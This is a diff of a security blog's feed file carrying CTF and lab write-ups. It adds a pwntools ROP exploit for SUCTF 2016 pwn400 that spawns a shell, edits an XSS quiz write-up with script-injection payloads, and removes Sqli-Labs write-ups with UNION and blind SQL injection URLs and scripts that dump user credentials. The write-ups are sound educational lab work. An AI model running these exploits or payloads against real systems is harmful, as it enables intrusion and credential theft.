@@ -106,6 +106,57 @@
   </entry>
   
   <entry>
+    <title>SUCTF-2016-pwn400-writeup</title>
+    <link href="http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/"/>
+    <id>http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/</id>
+    <published>2017-06-28T06:57:33.000Z</published>
+    <updated>2017-06-28T07:33:51.241Z</updated>
+    
+    <content type="html"><![CDATA[<p>SUCTF-2016-pwn400-writeup<br><a id="more"></a><br>IDA看，程序流程简单，有明显栈溢出漏洞。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/1.jpg?raw=true" alt=""></p>
+<p>无libc，无canary等保护。基本的思路如下：</p>
+<ul>
+<li>构造ROP链</li>
+<li>泄露system地址</li>
+<li>往bss段写入/bin/sh</li>
+<li>调用system</li>
+</ul>
+<p>最后的exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./simple"</span>)</div><div class="line">elf = ELF(<span class="string">"./simple"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">40</span></div><div class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006c3</span></div><div class="line">pop_rsi_pop_r15_ret = <span class="number">0x00000000004006c1</span></div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</div><div class="line">bss_addr = elf.bss() + <span class="number">0x18</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">"leak address =&gt; &#123;&#125;"</span>.format(hex(address)))</div><div class="line">	p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_ret)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(write_plt)</div><div class="line">	payload += p64(main_addr)</div><div class="line">	p.sendline(payload)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line">d = DynELF(leak,elf = elf)</div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(start_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_ret)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_plt)</div><div class="line">payload += p64(main_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/2.gif?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;SUCTF-2016-pwn400-writeup&lt;br&gt;
+    
+    </summary>
+    
+      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>pico-ctf-2013-pwn-writeup</title>
+    <link href="http://yoursite.com/2017/06/27/pico-ctf-2013-pwn-writeup/"/>
+    <id>http://yoursite.com/2017/06/27/pico-ctf-2013-pwn-writeup/</id>
+    <published>2017-06-27T10:14:35.000Z</published>
+    <updated>2017-06-27T10:14:35.368Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>ROP学习：64位栈溢出</title>
     <link href="http://yoursite.com/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
     <id>http://yoursite.com/2017/06/26/ROP学习：64位栈溢出/</id>
@@ -194,7 +245,7 @@
     <link href="http://yoursite.com/2017/06/25/xss-quiz-writeup/"/>
     <id>http://yoursite.com/2017/06/25/xss-quiz-writeup/</id>
     <published>2017-06-25T11:25:11.000Z</published>
-    <updated>2017-06-25T15:31:34.928Z</updated>
+    <updated>2017-06-28T06:56:02.558Z</updated>
     
     <content type="html"><![CDATA[<p>xss-quiz： <a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">http://xss-quiz.int21h.jp/</a><br><a id="more"></a></p>
 <h1 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
@@ -203,7 +254,8 @@
 <p>无反应，查看源代码：</p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true" alt=""></p>
 <p>需要闭合前面value的双引号，所以最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</div></pre></td></tr></table></figure></p>
-<h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p>多了一个选择country的功能，经过测试可知，过滤了尖括号。<br><img src="" alt=""></p>
+<h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p><a href="http://xss-quiz.int21h.jp/stage-3.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php</a></p>
+<p>多了一个选择country的功能。</p>
 ]]></content>
     
     <summary type="html">
@@ -935,117 +987,6 @@
     <summary type="html">
     
       &lt;p&gt;第六关是盲注&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sqli-Labs:Less5-writeup</title>
-    <link href="http://yoursite.com/2017/04/02/Sqli-Labs-Less5-writeup/"/>
-    <id>http://yoursite.com/2017/04/02/Sqli-Labs-Less5-writeup/</id>
-    <published>2017-04-02T13:27:16.000Z</published>
-    <updated>2017-04-03T02:45:45.650Z</updated>
-    
-    <content type="html"><![CDATA[<p>第五关是盲注<br><a id="more"></a></p>
-<h1 id="查看是否有注入"><a href="#查看是否有注入" class="headerlink" title="查看是否有注入"></a>查看是否有注入</h1><h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic2.jpg" alt=""><br>页面正常，返回：You are in……</p>
-<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos;</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic3.jpg" alt=""><br>报错。之后的过程要记得闭合单引号。</p>
-<h2 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h2><p>依次访问如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+</div><div class="line">http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+</div></pre></td></tr></table></figure></p>
-<p>页面返回信息不同。同时试着使用UNION SELECT注入，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+</div></pre></td></tr></table></figure></p>
-<p>页面返回 You are in……返回通用页面。故考虑盲注。</p>
-<h1 id="普通盲注攻击"><a href="#普通盲注攻击" class="headerlink" title="普通盲注攻击"></a>普通盲注攻击</h1><p>这里使用推断攻击技术，通过推断一次一位地逐步提取信息。</p>
-<h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。</p>
-<h2 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h2><h3 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char</div></pre></td></tr></table></figure>
-<ul>
-<li>num1和num2都是整数，char为单个字符。</li>
-<li>(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1)  会返回查询到结果（即各数据库名称）的第num1行。</li>
-<li>SUBSTRING(*,num2,1)  返回查询后结果的第num2个字母。</li>
-<li>SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。</li>
-</ul>
-<h3 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h3><ul>
-<li>通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。</li>
-<li>通过变化num1，num2，char，可以获取到最后的数据。</li>
-<li>多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。</li>
-</ul>
-<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line">dataset = <span class="string">" abcdefghijklmnopqrstuvwxyz_"</span></div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		result = <span class="string">""</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> dataset:</div><div class="line">				querysql = <span class="string">"AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span>+str(k)+<span class="string">",1),"</span>+str(i)+<span class="string">",1)='"</span>+j</div><div class="line">				recv = sendPayload(querysql)  </div><div class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">					<span class="keyword">if</span> j != <span class="string">' '</span>:</div><div class="line">						result += j</div><div class="line">						i += <span class="number">1</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">print</span> result</div><div class="line">						i = <span class="number">0</span></div><div class="line">  					<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
-<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic4.jpg" alt=""></p>
-<h2 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h2><p>Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。</p>
-<h3 id="Condition-1"><a href="#Condition-1" class="headerlink" title="Condition"></a>Condition</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Condition Example:</div><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 1 ,1)) &gt; 127</div></pre></td></tr></table></figure>
-<p>判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2）</p>
-<h3 id="Something-1"><a href="#Something-1" class="headerlink" title="Something"></a>Something</h3><p>在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知</p>
-<ul>
-<li>搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT  0 ,1), 11 ,1)) &gt; 0</div><div class="line">+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-5/?id=1' "</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure>
-<h3 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h3><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170402/sqlilabless5/pic5.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;第五关是盲注&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sqli-Labs:Less1-4-writeup</title>
-    <link href="http://yoursite.com/2017/04/02/Sqli-Labs-Less1-4-writeup/"/>
-    <id>http://yoursite.com/2017/04/02/Sqli-Labs-Less1-4-writeup/</id>
-    <published>2017-04-02T09:16:38.000Z</published>
-    <updated>2017-04-02T09:17:16.520Z</updated>
-    
-    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53<br><a id="more"></a></p>
-<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h1><p>题目是 GET Error based- Single quotes -String。关注点：基于错误，单引号，字符型注入。</p>
-<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=1&apos;</div></pre></td></tr></table></figure>
-<p>此时页面会产生报错。<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1.jpg" alt=""></p>
-<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,2,3 --+</div></pre></td></tr></table></figure>
-<p>通过UNION SELECT 或者 ORDER BY 语句可以发现字段数为 3 ，可显示位置为 2,3。尾部—+会被浏览器解释为— （空格），这在mysql里是注释。</p>
-<h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 FROM INFORMATION_SCHEMA.SCHEMATA --+</div></pre></td></tr></table></figure>
-<p>利用元数据表INFORMATION_SCHEMA获取数据库信息。<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3.jpg" alt=""></p>
-<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/</div><div class="line">?id=0&apos; UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x7365637572697479 --+</div></pre></td></tr></table></figure>
-<p>这里 hex(security)=0x7365637572697479</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3_tablename.jpg" alt=""></p>
-<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=</div><div class="line">0&apos;  UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x7573657273 --+</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3_columnsname.jpg" alt=""></p>
-<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-1/?id=</div><div class="line">0&apos; UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less1payload3_data.jpg" alt=""></p>
-<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h1><p>题目说是数值型注入。 不需要闭合引号。给出最终payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-2/?id=</div><div class="line">0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure></p>
-<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h1><p>题目提示 SINGLE QUOTES WITH TWIST。</p>
-<h2 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-3/?id=1&apos;</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170401/sqlilabless1-4/less3payload1.jpg" alt=""><br>注意到报错回显中有 )，说明需要闭合。</p>
-<h2 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2"></a>payload2</h2><h3 id="类似"><a href="#类似" class="headerlink" title="类似"></a>类似</h3><p>将Less1中的几段payload的前面的 0’ 改为 0’)  即可</p>
-<h3 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-3/?id=</div><div class="line">0&apos;)  UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+</div></pre></td></tr></table></figure>
